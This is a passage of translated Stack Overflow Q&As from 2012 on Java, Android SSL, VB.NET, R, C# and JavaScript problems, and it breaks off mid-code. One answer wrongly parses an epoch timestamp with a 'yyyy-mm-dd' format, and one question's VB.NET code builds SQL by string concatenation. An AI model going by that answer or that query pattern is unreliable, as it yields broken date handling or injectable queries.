> 
> 赞同：2
> 
> 时间：2012-08-04T05:55:44.587
> 
> 标签：java, loops, sudoku

我这里有问题。我没有得到完美的输出。以下是我为准备数独而编写的代码。即使我知道它的原因，因为它无法创建任何新的唯一数字，它正在打印默认值 0。我知道我错过了一些我想不到的东西。任何人都可以提出解决方案吗？提前致谢。

```
public class FinalSudoku 
{
    int a[][]=new int[9][9];
    public void initialize1()
    {
        for(int i=0;i<9;i++)
        {
         for(int j=0;j<9;j++)
        {
             a[i][j]=0;
        }

     }
    }
    protected boolean detectRow( int row, int num )
       {
          for( int col = 0; col < 9; col++ )
             if( a[row][col] == num )
                return false;

          return true ;
       }

    protected boolean detectCol( int col, int num )
       {
          for( int row = 0; row < 9; row++ )
             if( a[row][col] == num )
                return false ;

          return true ;
       }

    protected boolean detectBox( int row, int col, int num )
       {
          row = (row / 3) * 3 ;
          col = (col / 3) * 3 ;

          for( int r = 0; r < 3; r++ )
             for( int c = 0; c < 3; c++ )
             if( a[row+r][col+c] == num )
                return false ;

          return true ;
       }

    public void solve( int row, int col ) throws Exception
    {
        if( row > 8 )
             throw new Exception( "Solution found" ) ;

        if( a[row][col] != 0 )
             next( row, col ) ;
          else
          {
    for( int num = 1; num < 10; num++ )
    {
       if(detectRow(row,num) && detectCol(col,num) && detectBox(row,col,num) )
       {
          a[row][col] = num ;
          next(row, col) ;
       }
    }
          }
    }
    public void display()
    { 
        for(int i=0;i<9;i++)
        {
            for(int j=0;j<9;j++)
            {
                System.out.print(a[i][j]+" ");
            }
            System.out.println();
        }
    }

    public void next( int row, int col ) throws Exception
       {
          if( col < 8 )
             solve( row, col + 1 ) ;
          else
             solve( row + 1, 0 ) ;
       }  
    public static void main(String[] args) throws Exception
    {
        FinalSudoku fs = new FinalSudoku();
        fs.initialize1();

        fs.solve(0,0);

        fs.display();
    }

} 
```

此代码的输出：

1 2 3 4 5 6 7 8 9
4 5 6 7 8 9 3 2 1
7 8 9 1 2 3 4 5 6
2 1 4 3 6 5 8 9 7
3 6 7 2 9 8 1 4 5
5 9 8 0 0 0 0 0 0
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
0 0 0 0 0
0 0 0 0 0

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-04T06:09:45.273

您不是在编写求解器，而是在编写生成器。您的问题是您填写了值，而没有真正检查它们是否会阻止拼图。看看你的算法停止的地方。

```
1 2 3  4 5 6  7 8 9
4 5 6  7 8 9  3 2 1
7 8 9  1 2 3  4 5 6

2 1 4  3 6 5  8 9 7
3 6 7  2 9 8  1 4 5
5 9 8  0 0 0  0 0 0 < This row contains 5 and 8, 9

0 0 0  0 0 0  0 0 0
0 0 0  0 0 0  0 0 0
0 0 0  0 0 0  0 0 0
       ^
 This column contains 1,2,3,4 and 7

 And the center box, contains 6 
```

因此，所有数字都用于那个地方。

* * *

看看这里：[Wiki：数独算法：空白数独网格](http://en.wikipedia.org/wiki/Sudoku_algorithms#Blank_Sudoku_grids)
这段代码生成了一个填充网格，也许这很有趣？

* * *

感谢 Alex D，他的好观点：

如果您确实想像尝试那样使用蛮力算法，则需要将其备份并在达到无法成功的地步时尝试不同的解决方案。如果它一直倒退到一开始，没有任何选择可以尝试，那么就没有解决方案。有几种标准方法可以实现这种“带回溯的递归搜索”。

这种求解算法可以工作，但需要一些递归知识。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-08-19T20:13:56.217

此代码检查数独。如果正确，则 check_sudoku() 方法如果错误则返回 true，然后显示具有重复元素的行号和列号。

```
 public static void main(String[] args) {
    int array[][]={{9,6,3,1,7,4,2,5,8},
                   {1,7,8,3,2,5,6,4,9},
                   {2,5,4,6,8,9,7,3,1},
                   {8,2,1,4,3,7,5,9,6},
                   {4,9,6,8,5,2,3,1,7},
                   {7,3,5,9,6,1,8,2,4},
                   {5,8,9,7,1,3,4,6,2},
                   {3,1,7,2,4,6,9,8,5},
                   {6,4,2,5,9,8,1,7,3}};

    Sudoku sudoku=new Sudoku();
    if(sudoku.check_sudoku(array))
    {
        System.out.println("You won the game :)");
    }

}

public class Sudoku {

private int temp1[] = {1, 2, 3, 4, 5, 6, 7, 8, 9}, temp2[] = {1, 2, 3, 4, 5, 6, 7, 8, 9};
private int data1, data2;

public boolean check_sudoku(int array[][]) {
    for (int i = 0; i < 9; i++) {
        for (int j = 0; j < 9; j++) {
            data1 = array[i][j];
            data2 = array[j][i];
            if (data1 >= 10 || data2 >=10 || data1 <= 0 || data2 <= 0) {
                System.out.println("Invalid Solution because value must be in between 1 to 9");
                return false;
            } else if (temp1[data1 - 1] == 0 || temp2[data2 - 1] == 0) {
                System.out.println("Invalid Solution please check " + (i + 1) + " row " + (j + 1) + " column or " + (j + 1) + " row " + (i + 1) + " column");
                return false;
            } else {
                temp1[data1 - 1] = 0;
                temp2[data2 - 1] = 0;
            }
        }
        int check1[] = {1, 2, 3, 4, 5, 6, 7, 8, 9};
        int check2[] = {1, 2, 3, 4, 5, 6, 7, 8, 9};
        temp1 = check1;
        temp2 = check2;
    }
    return true;
} 
```

}

# java - 在java中将时间戳转换为日期并显示计数值

> ID：11806328
> 
> 赞同：-4
> 
> 时间：2012-08-04T05:56:17.867
> 
> 标签：java, mysql, web-services, soap, valueconverter

> **可能重复：**
> [在java中将时间戳转换为日期](https://stackoverflow.com/questions/11794648/converting-timestamp-to-date-in-java)

这是我的数据库：

*   日期状态

*   1343993311问

*   1343892452 C
*   1343892477

这里我要查看查询当前日期+状态=Q信息并获取计数值。

这是我的代码：

```
public class TodayQ {
 public int data(){
int count=0;

//count++;

try{
    Class.forName("com.mysql.jdbc.Driver");
    Connection con = DriverManager.getConnection("jdbc:mysql://localhost:3306/pro","root","");

    PreparedStatement statement =  con.prepareStatement("select * from orders where status='Q' AND date=CURDATE()");
     ResultSet result = statement.executeQuery();
     while(result.next()) {
            // Do something with the row returned.
            count++; //if the first col is a count.
        }

     }

      catch(Exception exc){
      System.out.println(exc.getMessage());
      }

    return count;
       }

        } 
```

dis 是我的另一门课：

```
 public class Demo {
    public static void main(String[] args) throws ParseException{
    TodayQ obj = new TodayQ();
    System.out.println(obj.data());

     }

     } 
```

在这里我必须编辑日期是（yyyy-mm-dd）格式。现在我得到了输出。但我希望在我的数据库上使用时间戳。那么如何在java中将时间戳转换为日期。如何在我的代码。请帮帮我。怎么办？？？？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T06:03:31.817

您应该在代码中尝试以下操作

```
DateFormat format = new SimpleDateFormat("yyyy-mm-dd");
Date date = format.parse("1343993311"); 
```

这里`date`对象将有`java.util.Date`对象引用。意味着时间戳被转换为`Date`对象。

# textarea - openWYSIWYG 禁用文本区域

> ID：11806334
> 
> 赞同：1
> 
> 时间：2012-08-04T05:57:25.253
> 
> 标签：textarea, openwysiwyg

这里有人使用 openWYSIWYG 1.4.7 吗？

我想通过调用只显示我的文本区域

```
WYSIWYG.display('textarea1'); 
```

我希望我的 textarea 上的文本不可选择，这就是我尝试这个的原因

```
<textarea1 id=textarea1 name='test1' disabled  ></textarea> 
```

但它不起作用。

有什么建议吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T06:20:06.870

我怀疑您是否可以阻止直接选择文本区域中的文本。您可以尝试将 iframe 之类的元素放在具有更高 Z-index 的顶部。因此，当用户选择他们所看到的测试区域时，他实际上将与透明 iframe 进行交互。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T15:39:05.647

请记住，不应将任何此类保护（包括上述保护）用作安全选项。用户总能找到一种方法来选择文本，甚至在提交之前对其进行编辑。他们可以使用像 Firebug 这样的 Web 开发人员插件来解决问题。

当用户自己在他的浏览器中做这个伎俩时，即使 HTTPS 也无法阻止这种情况。如果适用，您可以在服务器端进行验证。

# objective-c - 它如何启动 GUI 应用程序？

> ID：11806335
> 
> 赞同：-4
> 
> 时间：2012-08-04T05:57:31.770
> 
> 标签：objective-c, xcode, cocoa

假设我刚刚创建了一个 Cocoa 应用程序。我有三个文件：AppDelegate.h、AppDelegate.m 和 MainMenu.xib。

如果我不碰任何东西并运行应用程序，编译器是否真的编译 AppDelegate.h 和 AppDelegate.m 即使我没有写任何东西？

编译器如何知道要包含哪些文件？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-04T07:01:55.690

您的问题非常笼统，但我将概述一些高级细节。当你在 Xcode 中创建一个新项目时，你选择一个项目模板作为它的基础。在您的情况下，听起来您使用了简单的 Cocoa Application 模板。这将为您提供 AppDelegate.h、AppDelegate.h 和 MainMenu.xib 以及项目导航器中“支持文件”文件夹下列出的一些其他文件。我们稍后会谈到其中的一些。首先请注意，在您的新项目目录的顶层是一个类似于 MyProject.xcodeproj 的文件。这实际上是打包在一起的目录，看起来像一个文件，其中有一个名为 project.pbxproj 的文件。此文件是一个 XML 文件，其中包含构建的所有设置。它由项目模板预先配置以构建一个简单的应用程序。默认 project.pbxproj 中指定的基本构建过程是：

*   编译 AppDelegate.m 和 main.m
*   将目标代码与相关框架链接在一起
*   将可执行文件与项目中包含的其他资源（例如 MainMenu.xib）一起放入称为应用程序包的特殊目录结构中
*   然后 Finder 可以启动您新组装的应用程序包。

如果您查看 main.m，您会发现它看起来很像旧样式的 main.c，但它运行的是`NSApplicationMain()`. 此函数最终创建项目中 Info.plist 中列出的“主体类”的实例。默认情况下`NSApplication`，这是 Cocoa 提供的标准类。然后加载“主 nib 文件基本名称”，即项目的 MainMenu.xib。nib 文件基本上只是一堆“冻干对象”，它们被实例化并在它们之间建立连接。MainMenu.xib 文件中的对象之一是 的实例`AppDelegate`，这就是此代码被加载到内存中的方式。在默认模板`AppDelegate`中什么都不做，MainMenu.xib 只包含一个标准的应用程序菜单栏和一个空白窗口。这是您在运行应用程序时将看到的。

在编写一行代码之前，您可以免费获得所有这些作为起点。此时，Cocoa 编码人员通常会开始填写`AppDelegate`.xml 文件、编写新类或为 UI 的其他部分添加新的 nib 文件。

# android - 使用超过 3g 时未找到证书路径的信任锚，但在 WiFi 上工作正常

> ID：11806336
> 
> 赞同：7
> 
> 时间：2012-08-04T05:57:52.370
> 
> 标签：android, ssl, 3g

我的 android 项目正在使用 api 15。我正在使用 HttpsURLConnection 类通过 https 连接到服务器。在 WiFi 上一切正常，但如果我关闭 WiFi 并运行超过 3g，我会得到以下信息：

```
javax.net.ssl.SSLHandshakeException: java.security.cert.CertPathValidatorException: Trust anchor for certification path not found.       at org.apache.harmony.xnet.provider.jsse.OpenSSLSocketImpl.startHandshake(OpenSSLSocketImpl.java:413)
   at org.apache.harmony.xnet.provider.jsse.OpenSSLSocketImpl.startHandshake(OpenSSLSocketImpl.java:257)       at libcore.net.http.HttpConnection.setupSecureSocket(HttpConnection.java:210)
   at libcore.net.http.HttpsURLConnectionImpl$HttpsEngine.makeSslConnection(HttpsURLConnectionImpl.java:477)
   at libcore.net.http.HttpsURLConnectionImpl$HttpsEngine.connect(HttpsURLConnectionImpl.java:432)
   at libcore.net.http.HttpEngine.sendSocketRequest(HttpEngine.java:282)
   at libcore.net.http.HttpEngine.sendRequest(HttpEngine.java:232)       at libcore.net.http.HttpURLConnectionImpl.connect(HttpURLConnectionImpl.java:80)
   at libcore.net.http.HttpURLConnectionImpl.getOutputStream(HttpURLConnectionImpl.java:188)       at libcore.net.http.HttpsURLConnectionImpl.getOutputStream(HttpsURLConnectionImpl.java:280) 
```

如果我做错了什么，为什么它可以通过 WiFi 工作？

这里有更多信息。

如果我使用 openssl 查看服务器证书信息，

```
echo | openssl s_client -connect myserver.com:443 
```

返回服务器级别的自签名证书，而

```
echo | openssl s_client -connect myserver.com:443 -servername myserver.com 
```

返回“正确”的证书。我的服务器上有多个虚拟主机，每个虚拟主机都有自己的 rapidssl 颁发的证书，所以我“认为”这意味着我需要使用启用 TLS 的客户端。至少这是我对我在 Apache 启动日志中看到的消息的解释：

```
Name-based SSL virtual hosts only work for clients with TLS server name indication support 
```

如果到目前为止我是正确的，这是否意味着我的移动 3g 网络可能与 TLS 发生冲突，或者我应该做些什么？

我*可以*通过继承 DefaultHttpClient 并导入包含服务器自签名证书的密钥库来让事情超过 3g，但这绝对不是我的首选。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-08-27T22:44:17.710

添加`-servername`选项只是设置消息中的`Server Name Indication`字段，`Client Hello`如果目标主机包含许多，这有助于我们选择正确的证书，就像您的情况一样。但是，它与问题无关。

在 SSL 握手期间，证书以主题/颁发者对的形式交付，形成证书链。

即`google.com`证书链如下所示：

```
openssl s_client -connect google.com:443
CONNECTED(00000003)
depth=2 C = US, O = GeoTrust Inc., CN = GeoTrust Global CA
verify error:num=20:unable to get local issuer certificate
verify return:0
---
Certificate chain
 0 s:/C=US/ST=California/L=Mountain View/O=Google Inc/CN=*.google.com
   i:/C=US/O=Google Inc/CN=Google Internet Authority G2
 1 s:/C=US/O=Google Inc/CN=Google Internet Authority G2
   i:/C=US/O=GeoTrust Inc./CN=GeoTrust Global CA
 2 s:/C=US/O=GeoTrust Inc./CN=GeoTrust Global CA
   i:/C=US/O=Equifax/OU=Equifax Secure Certificate Authority
--- 
```

收到后，客户端会尝试从下到上（根）验证链中的所有发行者。如果客户端无法验证根证书， `Trust anchor for certification path not found`则会出现消息。

因此，回到 WiFi/3G 问题，您的移动网络的 DNS 可能无法解析证书链中的中间颁发者之一的地址。

更新：

您可以将颁发者的证书放入您的 APK 并`TrustManager`在您的代码中添加 via。这种方法可以克服接入网络的限制（如果有的话）。

# android - android 你必须在第 7 行提供一个 layout_width 属性

> ID：11806345
> 
> 赞同：0
> 
> 时间：2012-08-04T06:01:29.440
> 
> 标签：android, xml

```
I have been trying to run this code but getting this error since last 1 week. 
```

请帮忙！我已经声明了布局：宽度。尝试在滑动抽屉中使用 layout.width 并用 dip 替换 dp 但仍然遇到相同的错误。

```
<?xml version="1.0" encoding="utf-8"?>
    <RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
        android:layout_height="fill_parent"
        android:layout_width="fill_parent"> 

       <SlidingDrawer
           android:id="@+id/drawer"
           android:width="320dp"
           android:height="440dp"
           android:orientation="vertical"
           android:content="@+id/content"
           android:handle="@+id/handle">

           <ImageView 
               android:id="@+id/handle"
               android:layout_width="48dp"
               android:layout_height="48dp"
               android:src="@drawable/ic_launcher"/>

           <AnalogClock 
               android:id="@+id/content"
               android:background="#D0A0A0"
               android:layout_width="fill_parent"
               android:layout_height="fill_parent"/>
       </SlidingDrawer>
        </RelativeLayout> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T06:12:08.230

我相信布局标签是强制性标签。您还没有提供 layout_width 和 layout_height 给您的`SlidingDrawer`

```
android:layout_width="fill_parent"
android:layout_height="fill_parent" 
```

# c# - 如何使用c#将文件移动到虚拟目录

> ID：11806361
> 
> 赞同：0
> 
> 时间：2012-08-04T06:06:07.607
> 
> 标签：c#, iis, windows-installer, virtual-directory

我以编程方式创建了一个虚拟目录。现在我想上传一个 HTML 文件到创建的虚拟目录。我怎样才能做到这一点？

**片段：**

```
DirectoryEntry Rootdir =  new DirectoryEntry("IIS://localhost/W3SVC/1/Root");
DirectoryEntry dir= Rootdir .Children.Add("MyDirectory", "IIsWebVirtualDir");
Directory.CreateDirectory(Rootdir .Properties["Path"].Value+"\\MyDirectory");
dir.Properties["Path"].Insert(0, Rootdir .Properties["Path"].Value + "\\MyDirectory");
dir.CommitChanges();
Rootdir .CommitChanges();
dir.close();
Rootdir.close(); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T17:10:02.560

```
FileInfo fileInfo = new FileInfo(@"C:\inetpub\wwwroot\iisstart.htm");
File.Copy(fileInfo.FullName, Rootdir.Properties["Path"].Value + "\\MyDirectory" + "\\" + fileInfo.Name); 
```

# r - 一次删除两个或多个元素

> ID：11806363
> 
> 赞同：0
> 
> 时间：2012-08-04T06:06:17.787
> 
> 标签：r

我想删除向量中的第一个和第六个元素，
有更好的方法吗？

```
> x=c(4,42,232,4,55,74,45)
> x=x[-1]
> x=x[-5]
> x
[1] 42 232 4 55  45 
```

我可以删除它们一次，而不是两次？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T06:10:58.520

```
x <- c(4,42,232,4,55,74,45)
x <- x[-c(1,5)]
x

[1]  42 232   4  74  45 
```

# vb.net - 循环datalist中的数据

> ID：11806364
> 
> 赞同：0
> 
> 时间：2012-08-04T06:06:24.417
> 
> 标签：vb.net, loops, datalist

我如何遍历数据列表中的每个数据？因为我目前从“Label8”获得一个值，这导致我的“Label7”对所有人显示“否”。

```
 Protected Sub DataList2_ItemDataBound(ByVal sender As Object, ByVal e As System.Web.UI.WebControls.DataListItemEventArgs) Handles DataList2.ItemDataBound
    For Each li As DataListItem In DataList2.Items
        Dim labelasd As Label = DirectCast(e.Item.FindControl("**Label8**"), Label)
        Dim reviewid As Integer = labelasd.Text
        Dim connectionString As String = _
        ConfigurationManager.ConnectionStrings("ConnectionString").ConnectionString
        Dim connection As SqlConnection = New SqlConnection(connectionString)
        connection.Open()
        Dim sql As String = "Select Count(reviewYes) AS Expr1 From ProductReviewHelp Where ProductReviewID = " & reviewid & ""
        Dim command As SqlCommand = New SqlCommand(sql, connection)
        Dim reader As SqlDataReader = command.ExecuteReader()
        Dim countofreview As Integer = 0
        Dim reviewcountboolean As Boolean
        If (reader.Read()) Then
            If (IsDBNull(reader.GetValue(0)) = False) Then

                countofreview = reader.GetValue(0)

            End If
        End If
        If countofreview = 0 Then
            reviewcountboolean = False
        Else
            reviewcountboolean = True
        End If

        If (reviewcountboolean = True) Then

            Dim label1 As Label = DirectCast(e.Item.FindControl(**"Label7"**), Label)
            label1.Text = "Hello"

        ElseIf (reviewcountboolean = False) Then

            Dim label1 As Label = DirectCast(e.Item.FindControl(**"Label7"**), Label)
            label1.Text = "No"

        End If
    Next
End Sub 
```

我如何遍历数据列表中的每个数据？因为我目前从“Label8”获得一个值，这导致我的“Label7”对所有人显示“否”。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T14:09:23.097

您正在循环 DataList2 项，但是在每个循环中，您都使用当前项的逻辑更新 label7，从而有效地删除了前一个循环的结果。这意味着，当您到达最后一项时，Label7 将反映字符串“Hello”或“No”，具体取决于应用于循环中最后一项的逻辑。

除了这个逻辑错误之外，显示的代码中还有许多错误。

*   连接永远不会关闭。
*   您使用字符串连接而不是参数。
*   当在这种情况下更适合 ExecuteScalar 时，您可以使用 ExecuteReader。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-02-04T20:45:04.297

您可以迭代然后使用循环这里是一个例子

```
Try
        readFromDL1 = DirectCast(SqlDataSource1.Select(DataSourceSelectArguments.Empty), DataView)
        readFromQ = DirectCast(SqlDataSource7.Select(DataSourceSelectArguments.Empty), DataView)

    Catch ex As Exception

    End Try
    'End 
    'datalist1
    i = 0
    _rowCount = DataList1.Items.Count
    If _rowCount > 0 Then
        _getCall = DataList1.Items.Item(i).FindControl("lnkEdit")
    End If

    For Each readr As DataRowView In readFromQ
        findQNumber = readr(1).ToString()
        For Each readfdlr1 As DataRowView In readFromDL1
            findQNumber1 = readfdlr1(1).ToString

            Try
                indexofitems = DataList1.Items.Item(i1).ItemIndex
                If findQNumber.ToString = findQNumber1.ToString Then
                    _getCall = DataList1.Items.Item(indexofitems).FindControl("lnkEdit")
                    _getCall.Text = "Called"
                    _getCall.Enabled = False
                    _getCall.ForeColor = Drawing.Color.Red
                    _getCall.BackColor = Drawing.Color.Yellow

                End If
                i1 = i1 + 1
            Catch e As Exception

            End Try

        Next
        i1 = 0
        i = i + 1 
```

# html - 如何在 Rails 应用程序中从页面的一部分跳转到另一部分？

> ID：11806366
> 
> 赞同：0
> 
> 时间：2012-08-04T06:06:48.920
> 
> 标签：html

在我的应用程序中，我想从页面的一个部分跳转到另一部分......

但我不知道如何为此编码。

帮助将非常有义务

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T06:09:19.790

你应该使用 html 锚

[http://www.boogiejack.com/html/html-anchor-tag.html](http://www.boogiejack.com/html/html-anchor-tag.html)

# javascript - 调用焦点时按钮和跨度有什么区别？

> ID：11806369
> 
> 赞同：7
> 
> 时间：2012-08-04T06:07:19.733
> 
> 标签：javascript, html, button

HTML 代码片段：

```
<div contenteditable='true' id="txt">123<b>456</b>789</div> 
<button onclick="get()">Click Me</button> 
<span onclick="get()">Click Me</span> 
<script>   
  function get(){
      document.getElementById('txt').focus()
  }
</script> 
```

> *   单击名为 的节点`txt`，将光标设置在前面`7`，然后单击按钮。
>     观察 div 的光标位置。
>     
>     
> *   单击名为 的节点`txt`，将光标设置在前面`7`，然后单击 Span。
>     观察 div 的光标位置

对比div的光标位置，
你会发现`Button`点击事件并没有改变div原来的光标位置。
但是`Span`点击事件确实如此。

这真的很奇怪，所以这里发生了什么？
（我的测试基于 WebKit 浏览器。）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T07:55:45.870

Firefox 中的行为是相同的。

我会冒险并推测单击跨度将导致光标移动到您在跨度中单击的位置，这意味着它在 div 内的位置现在丢失了。将焦点移回 div 会将其放置在默认位置（开头）。点击按钮不会导致光标移动，因为按钮不能容纳光标；所以你的光标一直保持在 div 中的位置。

光标是 html 文档之一，也用于选择文本，例如；或者如果您打开插入符号浏览，则会在 Firefox 中显示。现在，如果您使用控件（文本框或文本区域）而不是带有 的 div `contenteditable=true`，则行为将如您所愿（单击跨度或按钮之间没有区别），因为控件管理自己的光标（为了测试这一点，只需将 div 替换为`textarea`)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-29T19:05:05.177

关于您正在做的事情的可访问性的一个说明，标签不像按钮那样被视为“可点击”资产。因此，当涉及到您正在创建的控件的仅键盘访问时，该标签不一定适用于那些不使用鼠标浏览页面内容并依赖键盘的人。

# c#-4.0 - 二进制转十进制？

> ID：11806374
> 
> 赞同：0
> 
> 时间：2012-08-04T06:08:51.257
> 
> 标签：c#-4.0, binary

`byte[]`在 C# 中，如果我要从二进制文件中读取“3 个 32 位浮点数”作为 a `Stream`，我将如何提取 3 个小数？寻找代码来读取数据，然后提取 3 位小数。假设该文件仅包含“3 个 32 位浮点数”。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-05T11:12:03.503

使用`BitConvert.ToSingle`：

```
// numbers to read
var count = 3; 

// read file bytes into a buffer
var buffer = new byte[sizeof(float) * count];
var stream = File.OpenRead("path/to/file");
stream.Read(buffer, 0, buffer.Length);
stream.Dispose();

var numbers = Enumerable
        .Range(0, count)
        // read 32 bits from buffer and convert to float
        .Select(index => BitConverter.ToSingle(buffer, index * sizeof(float)))
        .ToArray(); 
```

# java - 检查 Java 字符串中的正确字符数

> ID：11806376
> 
> 赞同：1
> 
> 时间：2012-08-04T06:08:59.347
> 
> 标签：java, arrays, string, split

我正在尝试计算 java 字符串中出现的字符数。

例如：

给定扑克手牌 6s/3d/2H/13c/Ad

/ 字符出现了多少次？= 4

用户可以输入不同数量的牌变量，因此硬编码检查出现的方法是行不通的。

分隔符可以是以下任何一种： - / 空格（一只手只允许使用一种分隔符类型）。所以我需要能够检查是否有任何一个分隔符出现了 4 次，否则给出了不正确的格式。

这是一些java代码，可以更好地了解我正在尝试做的事情：

```
 String hand = "6s/1c/2H/13c/Ad";
    System.out.println("Original hand: " + hand);

    // split the hand string into individual cards
    String[] cards = hand.split(hand);

    // Checking for separators
    // Need to check for the correct number of separators
    if(hand.contains("/")){
        cards = hand.split("/");
    } else if (hand.contains("-")){
        cards = hand.split("-");
    } else if (hand.contains(" ")){
        cards = hand.split(" ");
    } else {
        System.out.println("Incorrect format!");

    } 
```

任何帮助都会很棒！

这也是一个学校项目/家庭作业。

编辑 1------------------------------------------------ --------

好的，这是您提出建议后的代码

```
 String hand = "6s 1c/2H-13c Ad";
    System.out.println("Original hand: " + hand);

    // split the hand string into individual cards
    String[] cards = hand.split("[(//\\-\\s)]");

    if (cards.length != 5) {
        System.out.println("Incorrect format!");    
    } else {

        for (String card : cards) {
            System.out.println(card);
        }
    } 
```

上面给定的手牌格式不正确，因为用户只能对给定的手牌使用一种类型的分隔符。例如：

*   6s/1c/2H/13c/Ad - 正确
*   6s-1c-2H-13c-Ad - 正确
*   6s 1c 2H 13c Ad - 正确

如何确保用户只使用一种分隔符？

为到目前为止的答案干杯！

编辑 2 ------------------------------------------

因此，使用嵌套的 if 语句，我的代码现在看起来像这样：

```
 String hand = "6s/1c/2H/13c/Ad";
    System.out.println("Original hand: " + hand);

    // split the hand string into individual cards

    if(hand.contains("/")){
        String[] cards = hand.split("/");
        if(cards.length != 5){
            System.out.println("Incorrect format! 1");
        } else {
            for (String card : cards) {
                System.out.println(card);
            }
        }

    } else if(hand.contains("-")){
        String[] cards = hand.split("-");
        if(cards.length != 5){
            System.out.println("Incorrect format! 2");
        } else {
            for (String card : cards) {
                System.out.println(card);
            }
        }

    } else if(hand.contains(" ")){
        String[] cards = hand.split(" ");
        if(cards.length != 5){
            System.out.println("Incorrect format! 3");
        } else {
            for (String card : cards) {
                System.out.println(card);
            }
        }
    } else {
        System.out.println("Incorrect format! 4");
    } 
```

这种方式按预期工作，但很丑！

任何建议都会非常高兴。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T06:23:30.797

在不泄露答案的情况下，您希望指定要[拆分](http://docs.oracle.com/javase/1.4.2/docs/api/java/lang/String.html#split%28java.lang.String%29)的分隔符，以便返回的字符串数组如下所示：

```
cards[0] = "6s"
cards[1] = "1c"
cards[2] = "2H"
.
.
. 
```

在您的特定手串中，您可以为每张卡片使用方便的分隔符来实现此目的...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T06:23:02.030

采用`regex`

**例如：**

```
String reg = new String();
String s = "hjhjhkello/hi"; 
Pattern pattern = Pattern.compile("[(/-\\\\s)]");  // Will find for / or - or space
Matcher matcher = pattern.matcher(s);

while(matcher.find()){

 reg = matcher.group());

}

String[] arr = hand.split(reg); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-04T06:25:48.233

`hand.split(hand)`不会工作。正如@home 所说，您应该将输入字符串拆分为正则表达式。了解正则表达式不必（也不应该）匹配整个输入字符串——它应该匹配任何单独的*separator*。这就是`String.split`传递正则表达式时的工作原理——正则表达式匹配的每个位置都被视为分隔符，*匹配之间*的部分作为数组返回。

所以：尝试编写一个匹配任何一个分隔符的正则表达式。然后，检查返回的数组是否包含正确数量的元素。如果数组被调用`hand`，你可以使用`hand.length`它。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-04T09:26:51.037

我在第一个问题编辑之前写了这个，所以我回答的是原始问题而不是它的附录问题。

在[有关 String.split 的文档中](http://docs.oracle.com/javase/6/docs/api/java/lang/String.html#split%28java.lang.String,%20int%29)，尚不清楚空字符串是否算作子字符串。请注意`"--".split("-").length == 0`. 这个问题可能隐含地保证两个或多个字符分隔分隔符，但这是一个冒险的假设，并且 Java 的 String.split 会出现问题。

这是一个部分更简单的实现：

```
 char[] delims = {'/', ' ', '-'};
    int result = 0;
    for (char delim : delims) {
        for (int i = 0; i < hand.length(); i++) {
            if (hand.charAt(i) == delim) {
                ++result;
            }
        }
    } 
```

完整的代码如下，带有用于家庭作业的编辑评论。

```
interface Counter {
    int count(String hand);
}
class FirstCounter implements Counter {
    public int count(String hand) {
        String[] cards = hand.split(hand);
        if(hand.contains("/")){
            cards = hand.split("/");
        } else if (hand.contains("-")){
            cards = hand.split("-");
        } else if (hand.contains(" ")){
            cards = hand.split(" ");
        } else {
            // Prefer to fail fast unless your requirement
            // really is to only print "incorrect format"
            //System.out.println("Incorrect format!");
            throw new RuntimeException("Incorrect format!");
        }
        if (hand.endsWith("-") || hand.endsWith("/") || hand.endsWith(" ")) {
            return cards.length;
        }
        return cards.length - 1;
    }    
}
class SecondCounter implements Counter {
    public int count(String hand) {
        char[] delims = {'/', ' ', '-'};
        int result = 0;
        for (char delim : delims) {
            for (int i = 0; i < hand.length(); i++) {
                if (hand.charAt(i) == delim) {
                    ++result;
                }
            }
        }
        if (result == 0) {
            // This is a hack or inconsistent with requirements,
            // but necessary to match original posted code behavior
            throw new RuntimeException("Incorrect format!");
        }
        return result;
    }
}
class Main {
    private static int testCount = 0;

    static void realAssert(boolean condition) {
        if (!condition) {
            throw new AssertionError("Java has no real assert");
        }
    }

    static void test(Counter counter) {
        ++testCount;
        try {
            realAssert(counter.count("6s/3d/2H/13c/Ad") == 4);
            realAssert(counter.count("6s-3d-2H-13c-Ad") == 4);
            realAssert(counter.count("6s 3d 2H 13c Ad") == 4);
            // Don't forget boundary conditions
            realAssert(counter.count("6s-3d-2H-13c-") == 4);
            realAssert(counter.count("6s/3d/2H/13c/") == 4);
            realAssert(counter.count("6s 3d 2H 13c ") == 4);
            realAssert(counter.count("-6s-3d-2H-13c-") == 5);
            realAssert(counter.count("/6s/3d/2H/13c/") == 5);
            realAssert(counter.count(" 6s 3d 2H 13c ") == 5);
            realAssert(counter.count("--") == 2);
            // Remember to test error conditions
            try {
                counter.count("foobar");
                realAssert(false);
            } catch (RuntimeException e) {
                // Catching RuntimeException is normally bad
                // done only as example.
                // Also normally bad, this is an empty catch
                // block. These are sometimes useful, but always
                // at least add a comment that explains that this
                // catch block really should be empty, in this case
                // because the test was meant to throw an Error.
            }
            try {
                counter.count("foo/bar-baz");
                // Left as exercise for reader, based on question
                // it is possible this should be disallowed.
                //realAssert(false);
            } catch (RuntimeException e) {
                // Ditto above, intentionally empty catch
            }
            System.out.println("Test " + testCount + " succeeded");
        }
        catch (Error e) {
            // XXX: Don't catch Error in non-example code
            System.out.println("Test " + testCount + " failed");
            /* Normally don't use printStackTrace either */
            e.printStackTrace();
